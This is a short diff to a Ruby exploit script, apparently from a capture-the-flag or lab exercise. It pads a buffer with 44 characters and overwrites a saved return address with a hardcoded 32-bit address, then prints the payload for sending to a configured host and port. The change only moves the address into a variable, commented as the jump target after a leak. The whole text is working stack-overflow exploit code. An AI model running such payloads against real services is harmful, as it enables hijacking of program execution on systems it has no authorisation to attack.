@@ -4,12 +4,14 @@ require './ipconfig.rb'
 # need to fill in basic info in ipconfig.rb
 hostname = HOSTNAME
 port = PORT
+# where you want to jump after doing leaking
+return_addr = "\xcd\x88\x04\x08"
 
 # fill total 44 char
 buf = ''
 44.times { buf << 'a' }
 # fill the return address
-buf << "\xcd\x88\x04\x08"
+buf << return_addr
 buf << "\r\n"
 puts buf
 
